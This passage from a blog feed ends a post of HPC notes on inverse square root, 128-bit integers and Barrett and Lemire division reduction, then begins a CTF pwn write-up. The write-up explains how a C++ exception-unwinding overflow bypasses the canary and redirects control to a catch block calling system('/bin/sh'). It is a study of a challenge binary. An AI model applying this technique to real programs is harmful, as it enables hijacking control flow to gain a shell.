\log_2 x = e_x + \log_2(1 + m_x) \approx e_x + m_x + \sigma</script><h5 id="重新解释浮点数"><a href="#重新解释浮点数" class="headerlink" title="重新解释浮点数"></a>重新解释浮点数</h5><p>现在，基于这个近似，我们定义 $L = 2^{23}$（浮点数的尾数位数）和 $B = 127$（指数偏置），当我们将 $x$ 的位模式重新解释为整数 $I_x$ 时（符号位仍保留），可以得到：</p>
<script type="math/tex; mode=display">
I_x = L \times (e_x + B + m_x) = L \times (e_x + m_x + \sigma + B - \sigma) \approx L \times \log_2 x + L \times (B - \sigma)</script><p>乘L相当于向左移23位。通过调节 $\sigma$，可以使得这个近似非常精确。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/approx.svg"
                      class=""
                >
<p>从上述公式我们可以反解出$\log_2x$</p>
<script type="math/tex; mode=display">
\log_2x≈ \frac{I_x}{L}-(B-\sigma)</script><p>现在我们已经在数学上证明了这个快速的算法，我们还可以进一步推导，设 $y = \frac{1}{\sqrt{x}}$，我们可以代入上述推导出来的公式中：</p>
<script type="math/tex; mode=display">
\frac{I_y}{L} - (B - \sigma) \approx -\frac{1}{2} \left( \frac{I_x}{L} - (B - \sigma) \right)</script><p>解出 $I_y$ 得到：</p>
<script type="math/tex; mode=display">
I_y \approx \frac{3}{2} L (B - \sigma) - \frac{1}{2} I_x</script><p>这意味着我们不需要首先计算对数，以上公式实际上只需要常数 $\frac{3}{2} L (B - \sigma)$ 减去浮点数 $x$ 的整数表示的二分之一。代码中实现如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">i = * ( <span class="type">long</span> * ) &amp;y;</span><br><span class="line">i = <span class="number">0x5f3759df</span> - ( i &gt;&gt; <span class="number">1</span> );</span><br></pre></td></tr></table></figure></div>
<h5 id="与牛顿法结合"><a href="#与牛顿法结合" class="headerlink" title="与牛顿法结合"></a>与牛顿法结合</h5><p>然后我们求$x$的平方根倒数就可以用这个$f(y)=\frac{1}{y^2}-x$。然后代入牛顿法的迭代公式，能够得到如下结果：</p>
<script type="math/tex; mode=display">
f'(y) = -\frac{2}{y^3} \quad \Rightarrow \quad y_{i+1} = y_i \left( \frac{3}{2} - \frac{x}{2y_i^2} \right) = y_i \left( \frac{3 - x y_i^2}{2} \right)</script><p>代码中实现如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">x2 = number * <span class="number">0.5F</span>;</span><br><span class="line">y  = y * ( threehalfs - ( x2 * y * y ) );</span><br></pre></td></tr></table></figure></div>
<p>这样我们用<strong>平方根倒数速算法</strong>得到的初始值就比较接近真实值，第一次迭代后，结果已经精确到正确答案的99.8%，并且可以通过多次迭代进一步提高精度——这就是硬件中的实现方式：x86指令进行几次迭代，确保相对误差不超过 $1.5 \times 2^{-12}$。</p>
<h4 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h4><p>虽然整数的表示形式相对简单，但它的简洁性使得很多操作可以通过其他操作来表达。而浮点数的表示形式复杂，以至于许多操作都需要硬件实现。而高效处理整数运算需要在指令集上更加巧妙的应用。关于无符号整型以及有符号整型等的表示方法这里不在赘述。</p>
<p><strong>整数类型</strong></p>
<p>整数有不同的大小，但它们的基本操作方式大致相同。以下是常见的整数类型及其对应的字节和C语言数据类型：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>位数</th>
<th>字节数</th>
<th>有符号类型</th>
<th>无符号类型</th>
<th>汇编</th>
</tr>
</thead>
<tbody>
<tr>
<td>8</td>
<td>1</td>
<td>signed char</td>
<td>unsigned char</td>
<td>byte</td>
</tr>
<tr>
<td>16</td>
<td>2</td>
<td>short</td>
<td>unsigned short</td>
<td>word</td>
</tr>
<tr>
<td>32</td>
<td>4</td>
<td>int</td>
<td>unsigned int</td>
<td>dword</td>
</tr>
<tr>
<td>64</td>
<td>8</td>
<td>long long</td>
<td>unsigned long long</td>
<td>qword</td>
</tr>
</tbody>
</table>
</div>
<p><strong>字节顺序</strong>（Endianness）</p>
<p>整数的字节存储顺序存在两种可能性：</p>
<ol>
<li><strong>小端（Little-endian）</strong>：低位字节存储在前。例如，42<sub>10</sub> = 101010<sub>2</sub> 会存储为 010101。</li>
<li><strong>大端（Big-endian）</strong>：高位字节存储在前。所有前面的例子都采用了大端。</li>
</ol>
<p>小端有一个优势是，转换数据类型时（如将64位整数转换为32位整数），可以通过加载较少的字节（几乎不需要额外操作）来实现类型转换。而大端则有助于提升某些操作的效率，比如比较和打印。</p>
<p><strong>128位整数</strong></p>
<p>有时我们需要将两个64位整数相乘，得到一个128位整数。由于没有128位寄存器来存储这个结果，乘法指令通常会将结果分为两个部分：低64位和高64位。</p>
<p>例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 输入：64位整数a和b，存储在rsi和rdi寄存器中</span><br><span class="line">; 输出：128位乘积a * b，存储在rax（低64位）和rdx（高64位）</span><br><span class="line">mov     rax, rdi</span><br><span class="line">mov     r8, rdx</span><br><span class="line">imul    rsi</span><br></pre></td></tr></table></figure></div>
<p>有些编译器提供了对128位整数的支持。例如，在GCC和Clang中，提供了<code>__int128</code>类型。</p>
<p>例如：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">prod</span><span class="params">(<span class="type">int64_t</span> a, <span class="type">int64_t</span> b, __int128 *c)</span> &#123;</span><br><span class="line">    *c = a * (__int128) b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>128位整数的典型使用场景：</strong> 在没有直接支持128位整数的系统中，这些大整数通常会被分成两个64位寄存器。当需要存储两个64位整数相乘的结果时，结果将是一个128位的数字。由于没有128位寄存器，这个结果会被存储在两个独立的64位寄存器中——一个存储低64位，另一个存储高64位。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">__int128_t</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="type">int64_t</span> hi = x &gt;&gt; <span class="number">64</span>;    <span class="comment">// 提取高64位</span></span><br><span class="line"><span class="type">int64_t</span> lo = (<span class="type">int64_t</span>) x;  <span class="comment">// 提取低64位，截断高位</span></span><br></pre></td></tr></table></figure></div>
<p>在上面的例子中：</p>
<ul>
<li>通过将<code>x</code>右移64位，提取出128位值的高64位。</li>
<li>低64位通过将128位类型强制转换为64位类型来提取，这会丢弃高64位（即截断）。</li>
</ul>
<p><strong>128位整数的限制：</strong> 除了乘法运算，128位整数通常作为两个独立的64位寄存器进行处理。因此，在大多数情况下，使用一个完整的128位类型并不实际，因此对其的支持通常仅限于诸如乘法之类的操作。以下是一个简单的128位整数加法函数的例子，它使用了两个64位寄存器：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">__int128_t</span> <span class="title function_">add</span><span class="params">(<span class="type">__int128_t</span> a, <span class="type">__int128_t</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>当这个函数被编译时，它会被转换成汇编代码，通过两个64位值来进行处理。例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">add:</span><br><span class="line">    mov rax, rdi          ; 将第一个操作数a的低64位（rdi）移动到rax寄存器</span><br><span class="line">    add rax, rdx          ; 将第二个操作数b的低64位（rdx）加到rax，若溢出，则设置进位标志</span><br><span class="line">    adc rsi, rcx          ; 如果进位标志被设置，则将1加到rsi（即b的高64位）</span><br><span class="line">    mov rdx, rsi          ; 将结果移动到rdx寄存器（结果的高64位）</span><br><span class="line">    ret                   ; 返回结果</span><br></pre></td></tr></table></figure></div>
<p>在这段汇编代码中：</p>
<ul>
<li><code>rax</code>和<code>rdx</code>分别存储操作数<code>a</code>的低64位和高64位。</li>
<li><code>rsi</code>和<code>rcx</code>分别存储操作数<code>b</code>的低64位和高64位。</li>
<li>对两个部分分别进行加法操作，进位操作（<code>adc</code>）确保了低64位加法溢出时，高64位部分正确处理。</li>
</ul>
<p><strong>其他平台：</strong> 其他平台，如ARM，使用专门的指令（如<code>mulhi</code>、<code>mullo</code>）来返回乘法结果的高低部分，这使得处理大于字长的值变得更容易。类似地，x86 SIMD扩展也有32位指令来处理此类情况。</p>
<h4 id="整数除法"><a href="#整数除法" class="headerlink" title="整数除法"></a>整数除法</h4><p>与其他算术操作相比，<strong>除法</strong>通常表现得非常糟糕。无论是<strong>浮点数</strong>还是<strong>整数</strong>除法，硬件实现都非常复杂。其电路在算术逻辑单元（ALU）中占用了大量空间，计算过程涉及多个阶段，因此除法指令（<code>div</code>）及其相关操作通常需要10到20个时钟周期来完成。较小的数据类型可能会稍微减少延迟，但除法操作的复杂度和延迟依旧较高。</p>
<p>由于没有人想为取余操作单独实现一套逻辑，<code>div</code>指令同时负责<strong>除法</strong>和<strong>取余</strong>的计算。要执行一个32位整数除法，必须将<strong>被除数</strong>放入<code>eax</code>寄存器，并将<strong>除数</strong>作为唯一操作数传递给<code>div</code>指令。执行后，商（<strong>quotient</strong>）将存储在<code>eax</code>寄存器中，而余数（<strong>remainder</strong>）则存储在<code>edx</code>寄存器中。</p>
<p>需要注意的是，被除数必须存储在两个寄存器中：<code>eax</code>和<code>edx</code>。这种机制使得64位除以32位甚至128位除以64位的除法成为可能，类似于128位乘法的处理方式。在执行普通的32位整数除法时，我们需要将<code>eax</code>寄存器的值扩展为64位，并将高位部分存储在<code>edx</code>中：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">div(int, int):</span><br><span class="line">    mov  eax, edi    ; 将被除数（eax）从 edi 传入</span><br><span class="line">    cdq              ; 扩展 eax 为 64 位并存入 edx</span><br><span class="line">    idiv esi         ; 执行有符号除法</span><br><span class="line">    ret              ; 返回</span><br></pre></td></tr></table></figure></div>
<p>为了理解为什么需要扩展的实现，我们先来了解以下<code>cdq</code>指令是什么。<code>cdq</code> 的全称是 <strong>Convert Double to Quadword</strong>，它的作用是：</p>
<ul>
<li><strong>输入</strong>：<code>eax</code>（32 位整数）</li>
<li><strong>输出</strong>：<ul>
<li>如果 <code>eax</code> 是正数，<code>edx</code> 设为 <code>0</code></li>
<li>如果 <code>eax</code> 是负数，<code>edx</code> 设为 <code>0xFFFFFFFF</code>（即 <code>-1</code>）</li>
</ul>
</li>
</ul>
<p>换句话说，<code>cdq</code> 负责对 <code>eax</code> 进行 <strong>符号扩展</strong>，确保 <code>edx:eax</code> 组成一个正确的 <strong>64 位被除数</strong>。x86 的 <code>idiv</code>（<strong>有符号除法</strong>）和 <code>div</code>（<strong>无符号除法</strong>）指令是针对 <strong>64 位被除数 ÷ 32 位除数</strong> 设计的，而 <code>eax</code> 只有 <strong>32 位</strong>，为了让 <code>idiv</code> 进行除法运算，必须扩展为 <strong>64 位</strong> 存储在 <code>edx:eax</code> 组合中。</p>
<p>对于无符号除法，你只需将<code>edx</code>寄存器置为0，以避免它干扰计算：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">div(unsigned, unsigned):</span><br><span class="line">    mov  eax, edi    ; 将被除数（eax）从 edi 传入</span><br><span class="line">    xor  edx, edx    ; 清空 edx</span><br><span class="line">    div  esi         ; 执行无符号除法</span><br><span class="line">    ret              ; 返回</span><br></pre></td></tr></table></figure></div>
<p>在这两种情况下，除了<code>eax</code>中的商外，你还可以通过<code>edx</code>访问余数。</p>
<p><strong>取余操作</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mod(unsigned, unsigned):</span><br><span class="line">    mov  eax, edi    ; 将被除数（eax）从 edi 传入</span><br><span class="line">    xor  edx, edx    ; 清空 edx</span><br><span class="line">    div  esi         ; 执行无符号除法</span><br><span class="line">    mov  eax, edx    ; 将余数（edx）存入 eax</span><br><span class="line">    ret              ; 返回</span><br></pre></td></tr></table></figure></div>
<h5 id="优化方式"><a href="#优化方式" class="headerlink" title="优化方式"></a>优化方式</h5><p>整数除法在 CPU 中的执行速度通常非常慢，即使是完全由硬件实现的 <code>div</code> 指令，其执行周期也远高于加法或乘法。为了解决这个问题，如果 <strong>除数是一个常数</strong>，可以使用一些优化技巧，将 <strong>除法转换为乘法</strong>，以提高效率。</p>
<p>如果除数是 <strong>2 的幂</strong>，可以使用 <strong>二进制移位</strong> 来替代 <code>div</code>，从而极大地提高计算速度：</p>
<ul>
<li><code>x / 2^n</code> 可以用 <strong>右移</strong> (<code>x &gt;&gt; n</code>) 代替。</li>
<li><code>x % 2^n</code> 可以用 <strong>按位与</strong> (<code>x &amp; (2^n - 1)</code>) 代替。</li>
</ul>
<p>还有种方式是在编译阶段<strong>估算</strong>除数的倒数<strong>d</strong>，然后在运行时直接乘上d即可。</p>
<h5 id="Barrett-约简（Barrett-Reduction）"><a href="#Barrett-约简（Barrett-Reduction）" class="headerlink" title="Barrett 约简（Barrett Reduction）"></a>Barrett 约简（Barrett Reduction）</h5><p>上述<strong>d的估算</strong>成了我们现在待解决的问题，我们可以改写d为：</p>
<script type="math/tex; mode=display">
d = \frac{m}{2^s}</script><p>其中 $m$ 是一个“魔数”（magic number），$s$ 是一个合适的二进制移位数，使得：</p>
<script type="math/tex; mode=display">
\lfloor x / y \rfloor = \lfloor x \cdot m / 2^s \rfloor</script><p>这意味着整数除法可以用<strong>乘法和右移</strong>来完成：</p>
<script type="math/tex; mode=display">
x / y \approx (x \cdot m) \gg s</script><p>编译器会自动优化常数除法。例如，对于 <code>x / (10^9 + 7)</code>，可以用以下汇编指令代替：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 输入 (rdi): x</span><br><span class="line">; 输出 (rax): x mod (m=1e9+7)</span><br><span class="line">mov    rax, rdi</span><br><span class="line">movabs rdx, -8543223828751151131  ; 预加载魔数</span><br><span class="line">mul    rdx                        ; 乘法</span><br><span class="line">mov    rax, rdx</span><br><span class="line">shr    rax, 29                    ; 右移</span><br></pre></td></tr></table></figure></div>
<p>这样就避免了昂贵的整数除法。现在我们的问题就变成了是否肯定存在并能找到那么一组m与s可以进行表示1/y。</p>
<p>如果我们指定一个固定的移位值<strong>s</strong>，那么我们的<strong>m</strong>主要有两种选择，$⌊2^s/y⌋ 或 ⌈2^s/y⌉$ ，如果我们把前者代入式子：</p>
<script type="math/tex; mode=display">
\lfloor \frac{x*\lfloor 2^s/y \rfloor }{2^s} \rfloor</script><p>会发现当y为奇数时，除法一定会有余数，经向下取整后结果必然小于$x/y$。那么我们来考虑另外一种情况。</p>
<script type="math/tex; mode=display">
\lfloor x/y \rfloor=\lfloor \frac{x*m }{2^s} \rfloor=\lfloor \frac{x*\lceil 2^s/y \rceil }{2^s} \rfloor</script><p>代入m的边界条件：</p>
<script type="math/tex; mode=display">
2^s/y \le \lceil 2^s/y \rceil < 2^s/y + 1</script><p>即：</p>
<script type="math/tex; mode=display">
x / y - 1 < \lfloor x \cdot m / 2^s \rfloor < x / y + x / 2^s</script><p>我们能发现结果落在一个大小为 $(1+x/2^s)$ 的区间内，这样我们只要找到<strong>一个s</strong>，使得对于<strong>所有x</strong>都有一个整数在此区间内，那么这个算法就能确保给出正确的答案。事实上，我们只需把s设置的比较大，就可以实现这个目的。</p>
<p>最坏情况发生在<strong>最接近 1 的除法</strong>，即：</p>
<script type="math/tex; mode=display">
x = 2^n - 2, \quad y = 2^n - 1</script><p>这样，商的误差范围最大：</p>
<script type="math/tex; mode=display">
\frac{x}{y} - 1 < \lfloor x \cdot m / 2^s \rfloor < \frac{x}{y} + \frac{x}{2^s}</script><p>但如果 $s \geq n$，那么这个范围内<strong>只能包含一个整数</strong>，保证计算结果正确。</p>
<p>总的来说，巴雷特约简就是将运行时的除法开销转移到了编译时。</p>
<h5 id="Lemire-约简（Lemire-Reduction）"><a href="#Lemire-约简（Lemire-Reduction）" class="headerlink" title="Lemire 约简（Lemire Reduction）"></a>Lemire 约简（Lemire Reduction）</h5><p><strong>Barrett 约简</strong>是一种比较复杂的算法，而且它通过间接计算来生成一系列指令用于求模运算，因此可能会带来一些性能上的开销。而一种新的方法——Lemire 降维法（2019年提出）则更简单，并且在某些情况下，实际上比 Barrett 方法更快。尽管目前这个方法还没有一个公认的名称，但在这里我们称其为 <strong>Lemire 约简</strong>。</p>
<p>假设我们有一个整数 <code>179</code> 和除数 <code>6</code>，它们的除法结果可以表示为：</p>
<script type="math/tex; mode=display">
\frac{179}{6} = 29.8333... \approx 29.83</script><p>这个浮点数表示为：</p>
<script type="math/tex; mode=display">
179 / 6 = 29.83 \quad \text{（或者表示为浮点数：} 11101.1101010101 \ldots \text{）}</script><p>在这种表示下，我们如何提取我们所需要的部分呢？</p>
<ol>
<li><strong>整数部分</strong>（29）可以通过简单地取浮点数的小数点前部分（即取整）来获得。</li>
<li><strong>小数部分</strong>（即分数 $\frac{5}{6}$）可以通过取小数点后的部分得到。</li>
<li><strong>余数</strong>（5）则可以通过将小数部分乘以除数 <code>y</code> 来得到。</li>
</ol>
<p>对于 32 位整数，我们可以设定一个常量 <code>s = 64</code>，并查看在 <strong>乘法和移位</strong> 方案中的计算方式：</p>
<script type="math/tex; mode=display">
\left\lfloor \frac{x}{y} \right\rfloor = \left\lfloor \frac{x \cdot m}{2^s} \right\rfloor = \left\lfloor \frac{x \cdot \lceil \frac{2^s}{y} \rceil}{2^s} \right\rfloor</script><p>在这里，我们所做的操作是通过一个浮点常量 <code>m</code> 来乘以 <code>x</code>，然后通过移位和取整来实现。</p>
<p>如果我们不是取高位（整数部分），而是取低位，这就对应于小数部分。如果我们再将其乘以除数 <code>y</code>，并取整，就能得到余数：</p>
<script type="math/tex; mode=display">
r = \left\lfloor \left( (x \cdot \lceil \frac{2^s}{y} \rceil) \mod 2^s \right) \cdot y \right\rfloor</script><p>这样就能精确地得到余数。其工作原理是通过将浮点乘法链式组合来得到一个非常精确的结果，且误差是常量级别的 $O(\epsilon)$，其中 $\epsilon = O( \frac{1}{2^s} )$。由于误差小于1，结果将会是精确的。</p>
<p>以下是实现 Lemire 约简的代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">uint32_t</span> y;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> m = <span class="built_in">uint64_t</span>(<span class="number">-1</span>) / y + <span class="number">1</span>; <span class="comment">// ceil(2^64 / y)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">mod</span><span class="params">(<span class="type">uint32_t</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> lowbits = m * x;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="type">__uint128_t</span>) lowbits * y) &gt;&gt; <span class="number">64</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">div</span><span class="params">(<span class="type">uint32_t</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="type">__uint128_t</span>) m * x) &gt;&gt; <span class="number">64</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>除法可除性检查</strong></p>
<p>我们还可以通过乘法来检查 <code>x</code> 是否能被 <code>y</code> 整除。具体地，<code>x</code> 能被 <code>y</code> 整除当且仅当：如果乘法后的小数部分（即 <code>m * x</code> 的低 64 位）没有超过 <code>m</code>，则 <code>x</code> 可被 <code>y</code> 整除。如果超过了，乘法的结果在再次与 <code>y</code> 相乘并右移 64 位时会得到一个非零数值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_divisible</span><span class="params">(<span class="type">uint32_t</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> m * x &lt; m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>缺点</strong></p>
<p>Lemire 约简的唯一缺点是，它需要使用原始整数类型的 4 倍大小来进行乘法操作，而其他约简方法（如 Barrett 约简）只需要双精度浮点数就可以工作。因此，这种方法在内存上可能会有一定的开销。</p>
]]></content>
      <categories>
        <category>HPC</category>
      </categories>
      <tags>
        <tag>HPC</tag>
        <tag>optimization</tag>
      </tags>
  </entry>
  <entry>
    <title>Exploits under exception handling</title>
    <url>/blog/2024/09/21/Exploits-under-exception-handling/</url>
    <content><![CDATA[<h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>在栈溢出漏洞中，程序没有控制或错误控制输入的大小导致了该漏洞的产生。那我们很自然会想到能不能用<code>try</code>  <code>throw</code> <code>catch</code>的异常机制来捕获栈溢出行为，从而能更直观的获取错误信息，也在一定程度上避免了一些奇怪的错误产生。但在c++的异常处理实现中，如果我们放任输入数据超过缓冲区大小，冀以异常机制来捕获栈溢出，结果将不尽如人意，甚至还会导致canary保护机制的绕过。</p>
<h4 id="原理-amp-题目分析"><a href="#原理-amp-题目分析" class="headerlink" title="原理&amp;题目分析"></a>原理&amp;题目分析</h4><p>这里借助题目对其原理进行理解，其中加入了个人的一些推测和理解，有问题处希望师傅们批评指正。</p>
<h5 id="2024-羊城杯-logger"><a href="#2024-羊城杯-logger" class="headerlink" title="[2024 羊城杯]logger"></a>[2024 羊城杯]logger</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170437604.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170505641.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170518829.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170528338.png"
                      class=""
                >
<p>这里我一开始参考 <a class="link"   href="https://www.bilibili.com/video/BV1eE421L7ZE/"  title="" target="">DASCTF X GFCTF 2024四月-pwn-control【异常机制】<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>这个视频，想要覆盖掉rbp打栈迁移，实际从throw触发异常到catch捕获的主逻辑在<code>__cxa_throw</code>的<code>_Unwind_RaiseException</code>函数里，其中 <code>_Unwind_RaiseException</code> 是用于栈展开（stack unwinding）的关键函数之一，其主要功能如下：</p>
<ul>
<li>这个函数负责执行栈展开，即遍历当前调用栈上的各个栈帧，寻找匹配的 <code>catch</code> 块。</li>
<li>栈展开过程中，函数会逐帧回溯，并在每个栈帧上调用编译器生成的处理函数来检查是否存在与异常类型匹配的 <code>catch</code> 块。</li>
<li>如果找到匹配的 <code>catch</code> 块，栈展开停止，控制权转移到该块。</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170552763.png"
                      class=""
                >
<p>从这个函数跳转出来后，会进入<code>0x4019a1</code>这里执行，我们对照IDA中的内容会发现这里实质上是<code>cleanup</code>这个子函数，该函数的主要功能如下：</p>
<ul>
<li><p>在栈展开的过程中，每个栈帧可能包含需要执行的清理操作（如调用析构函数）。</p>
</li>
<li><p>如果 <code>_Unwind_RaiseException</code> 确定某个栈帧不包含匹配的 <code>catch</code> 块，但需要进行清理操作，会调用与该栈帧关联的清理函数。这个清理函数通常会执行栈帧中需要的析构函数或者其他资源释放操作。</p>
</li>
<li><p>IDA 中识别为 <code>cleanup()</code> 的函数，就是这些清理操作的函数，它用于处理抛出异常过程中需要释放的资源。</p>
</li>
</ul>
<p>这个vuln函数的命名是因为我一开始以为这个莫名其妙的无作为的函数是解题的关键，但通过以上的理解，其实这个函数更有可能是执行清理的具体函数，但由于该栈帧中没有需要清理的内容，所以显示为空。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170608549.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170616808.png"
                      class=""
                >
<p>然后会调用<code>__Unwind_Resume</code>，这个函数是 C++ 异常处理机制中的一个重要函数，它用于在栈展开过程中恢复异常处理的流程，通常在执行完清理操作后继续展开栈帧。在该函数的末尾，我们发现我们的rbp实际已经被赋值为了想要的值。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170639538.png"
                      class=""
                >
<p>但该题目与视频中的那道题最大的不同是，在将rbp控制后，没有机会进行leave;ret了，主函数是一个死循环，退出循环的方式是选项3直接调用exit退出。那么我们就没有机会打栈迁移了。</p>
<p>那么我们需要利用新的方法，这时我参考了<a class="link"   href="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html"  title="" target="">羊城杯 2024 pwn writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>这篇wp中给的解法，发现程序中有很多地方另有玄机。其实程序中还有很多try,catch的组合，在没有被调用的函数中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170659736.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170739062.png"
                      class=""
                >
<p>什么？程序中居然有catch段中存在对system函数的调用！后面我们通过调试其实可以发现上面打印的错误信息的参数存在src中，正常会打印出Buffer Overflow这个信息，而且0x4040a0也会做为system的参数。更巧的是，一直被我们忘在一边的trace函数中边界处理不当，当i=8时，实际可以往src处写入0x10个字节。那么我们就可以把/bin/sh写入src中，然后想办法把程序控制流转向这个catch块。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170749201.png"
                      class=""
                >
<p>这里我们的问题又回到了如何劫持程序控制流，参考exp可以发现，是通过覆盖该函数栈帧的返回地址为0x401bc7来劫持的。那么结合前面所分析的函数调用链，其实我们可以这样子从大体上理解：出现调用cleanup是因为当前栈帧不匹配catch块，所以要进行清理，之后用<code>__unwind_resume</code>继续找匹配的catch块时，由于返回地址被改为了一个catch块的handler，所以可以直接匹配执行。要深入理解为什么改返回地址可行，我们可以通过追踪rcx值的变化实现，因为最后从<code>__unwind_resume</code>跳转到目标地址是通过<code>mov rsp,rcx;pop rcx;jmp rcx</code>实现的。提取出与rcx变化有关的指令按顺序如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;_Unwind_Resume+316&gt; call 0x7fa75620d6a0</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+337&gt; call 0x7fb2f2d9dc20</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+402&gt; mov rcx, rax	#实际获取了上一个函数的返回值</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+414&gt; lea rcx, [rbp + rcx + 8]</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+447&gt; mov rsp,rcx</span><br><span class="line">&lt;_Unwind_Resume+450&gt; pop rcx</span><br><span class="line">&lt;_Unwind_Resume+451&gt; jmp rcx</span><br></pre></td></tr></table></figure></div>
<p>我们可以再跟进<code>0x7fb2f2d9dc20</code>看一下，发现只是对rdx做了一些改变，要再往前找。而前面的<code>0x7fa75620d6a0</code>执行后恰好使rax变为0x90，和后面赋给rcx值时的rax值相同，说明该函数是关键，进去看看。</p>
<p>其中的逻辑相当复杂，但在有个17次的循环后，有看到原来栈帧的返回地址，而执行过程中rbp始终为0x7ffcc254a5b0，_Unwind_Resume函数开始调用时也并没有改变rbp的值，这里rax实际能计算出一个当前rbp到处理栈帧返回地址附近的一个偏移，然后最后就能使rcx成为返回地址处的内容并跳转过去当作目标catch的handler函数进行执行。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170800205.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170811667.png"
                      class=""
                >
<p>其实这和正常的栈溢出有点像，那我们不禁想如果覆盖成别的其他不属于handler的地址会如何呢？比如我们把返回地址覆盖为main试试，结果是会报出<strong>terminate called after throwing an instance of ‘char*’</strong>，因为异常没有正常匹配。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170824548.png"
                      class=""
                >
<p>然后我们可以试试换一个catch(int)的handler进行匹配，发现会有如下错误，rdx是由前面<code>mov  rdx, qword ptr [rdx]</code>得到的，前面的rdx值为0x404208，也就是我们可控的地址，我们可以输入一个合法的地址进去看看。最后还是会报<strong>terminate called after throwing an instance of ‘char*’</strong>。后面看了别人博客才发现这个匹配的流程需要一定的经验。其他函数的catch块对应不上。</p>
<blockquote>
